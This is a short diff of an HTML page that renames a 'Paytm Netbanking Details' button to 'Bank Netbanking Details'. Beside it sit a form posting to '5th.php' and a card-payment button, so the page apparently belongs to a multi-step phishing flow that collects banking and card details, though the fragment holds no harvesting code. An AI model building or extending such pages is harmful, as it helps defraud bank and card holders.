@@ -94,7 +94,7 @@ span.psw {
 
 
  <label>
-    <center><button type="submit">via Paytm Netbanking Details</button></center>
+    <center><button type="submit">via Bank Netbanking Details</button></center>
 
 <form action="5th.php" method="post"      
     <center><button type="submit">via Credit/Debit Card<value="Credit/Debit Card"></center>
